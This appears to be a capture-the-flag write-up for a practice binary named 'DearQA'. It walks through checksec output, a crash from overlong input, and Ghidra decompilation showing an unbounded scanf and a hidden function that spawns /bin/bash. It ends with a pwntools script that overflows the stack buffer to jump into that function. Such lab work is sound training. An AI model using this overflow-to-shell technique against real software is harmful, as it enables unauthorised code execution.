<h1>Dear QA</h1>
<p>2025, October 6</p>


<p>1.1. What is the binary architecture?<br>
<code>x64</code></p>

<p>
  
- identified <strong>ELF 64-bit LSB executable, x86-64, ...</strong><br>
- <strong>x86-64</strong> = <strong>x64</strong> describe the same underlying 64-bit CPU architecture that extends the 32-bit x86</p>

```bash
$ file DearQA.DearQA
DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
```


<img width="1793" height="789" alt="image" src="https://github.com/user-attachments/assets/66312da5-936b-4cdb-82f5-a6da643d6566" />

<br>
<br>
<br>

```bash
$ checksec --file=DearQA.DearQA
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   71 Symbols        No    0               1               DearQA.DearQA
```

```bash
$ ./DearQA.DearQA
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: AAAAAAAA
Hello: AAAAAAAA
```

<p>

- provided a huge sequence of A´s<br>
- identified <strong>Segmentation fault (core dumped)</p>

```bash
$ ./DearQA.DearQA
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

<br>
<p>
  
- launched <strong>Ghidra</strong></p>


<img width="1330" height="210" alt="image" src="https://github.com/user-attachments/assets/64043c16-67d8-4670-9535-a1b549216554" />

<br>
<br>
<br>
<p>
  
- main() function</p>

```bash
undefined8 main(void)

{
  undefined local_28 [32];
  
  puts("Welcome dearQA");
  puts("I am sysadmin, i am new in developing");
  printf("What's your name: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400851,local_28);
  printf("Hello: %s\n",local_28);
  return 0;
}
```

<img width="1791" height="886" alt="image" src="https://github.com/user-attachments/assets/8aa89c9d-3035-4089-a524-01e10de382f8" />

<br>
<br>
<br>
<p>
  
- vuln() function</p>

```bash
void vuln(void)

{
  puts("Congratulations!");
  puts("You have entered in the secret function!");
  fflush(stdout);
  execve("/bin/bash",(char **)0x0,(char **)0x0);
  return;
}
```

<img width="1796" height="788" alt="image" src="https://github.com/user-attachments/assets/4832e206-88ea-4a25-8d03-774a9739bddd" />


<br>
<br>
<br>
<p>
  
- Search > For Strings ...</p>

<img width="1448" height="664" alt="image" src="https://github.com/user-attachments/assets/2fed4dea-1f87-4ac3-88c7-7f7d2fb6df50" />



<p><em>script.py</em></p>

```bash
$ cat script.py
from pwn import *

target = process("/mnt/c/Users/Rosana/TryHckMe/DearQA.DearQA")
target.recvuntil(b"What's your name: ")

payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa"
payload += p64(0x00400686)

target.sendline(payload)
target.interactive()
```

